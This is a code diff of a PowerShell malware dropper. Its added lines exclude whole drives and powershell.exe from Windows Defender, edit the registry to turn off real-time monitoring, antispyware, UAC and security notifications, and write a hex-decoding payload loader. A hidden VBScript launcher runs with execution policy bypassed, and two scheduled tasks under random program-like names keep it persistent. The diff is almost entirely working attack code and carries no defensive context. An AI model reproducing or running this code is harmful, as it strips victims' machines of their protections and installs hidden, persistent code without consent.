@@ -19,13 +19,29 @@ $randomProgram = Get-Random -InputObject $programs
 $randomPath = Get-Random -InputObject $paths
 $fullPath = Join-Path -Path $randomPath -ChildPath $randomProgram
 New-Item -Path $fullPath -ItemType Directory -Force | Out-Null
-$scriptContent = @"
-Add-MpPreference -ExclusionPath 'C:\'
-Add-MpPreference -ExclusionPath '$env:TEMP'
-Add-MpPreference -ExclusionPath '$env:APPDATA'
-Add-MpPreference -ExclusionPath '$env:SystemDrive\programdata\Windata'
 
-# باقي الكود
+$scriptContent = @"
+Add-MpPreference -ExclusionPath `"$env:SystemDrive\`"
+Add-MpPreference -ExclusionPath `"C:\`"
+Add-MpPreference -ExclusionPath `"$env:TEMP`"
+Add-MpPreference -ExclusionPath `"$env:APPDATA`"
+Add-MpPreference -ExclusionPath `"$env:SystemDrive\programdata\Windata`"
+Add-MpPreference -ExclusionProcess `"powershell.exe`"
+Add-MpPreference -ExclusionPath `"C:\ProgramData\GG-Win`"
+
+reg add `"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications`" /v ToastEnabled /t REG_DWORD /d 0 /f
+reg add `"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications`" /v LockScreenToastEnabled /t REG_DWORD /d 0 /f
+reg add `"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\MSEdge`" /v Enabled /t REG_DWORD /d 0 /f
+reg add `"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter`" /v Enabled /t REG_DWORD /d 0 /f
+reg add `"HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Explorer`" /v DisableNotificationCenter /t REG_DWORD /d 1 /f
+reg add `"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection`" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
+reg add `"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Features`" /v TamperProtection /t REG_DWORD /d 1 /f
+reg add `"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender`" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
+reg add `"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender`" /v TamperProtection /t REG_DWORD /d 1 /f
+reg add `"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender`" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+cls
+
 function HexStringToByteArray([string]`$hex) {
     `$bytes = New-Object byte[] (`$hex.Length / 2)
     for (`$i = 0; `$i -lt `$bytes.Length; `$i++) {
@@ -77,7 +93,9 @@ if (`$decBytes -ne `$null) {
 }
 Remove-Item `$tempPath -Force
 "@
+
 Set-Content -Path (Join-Path -Path $fullPath -ChildPath "$randomProgram.ps1") -Value $scriptContent -Force
+
 $vbsContent = @'
 On Error Resume Next
 Dim arr, cmd, shell
@@ -86,19 +104,27 @@ cmd = Join(arr, "") & " -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -
 Set shell = CreateObject("WScript.Shell")
 shell.Run cmd, 0, False
 '@
+
 Set-Content -Path (Join-Path -Path $fullPath -ChildPath "$randomProgram.vbs") -Value $vbsContent -Force
+
 Start-Sleep 2
+
 try {
     $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$fullPath\$randomProgram.vbs`" `"$fullPath\$randomProgram.ps1`""
     $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
     Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $randomProgram -Force
 } catch {}
+
 Start-Sleep 2
+
 $taskName2 = "${randomProgram}Startup"
 $vbsFullPath = "$fullPath\$randomProgram.vbs"
 $ps1FullPath = "$fullPath\$randomProgram.ps1"
+
 try {
     schtasks /create /tn $taskName2 /tr "`"wscript.exe`" `"$vbsFullPath`" `"$ps1FullPath`"" /sc MINUTE /mo 45 /f
 } catch {}
+
 Start-Sleep 5
+
 schtasks /run /tn $randomProgram
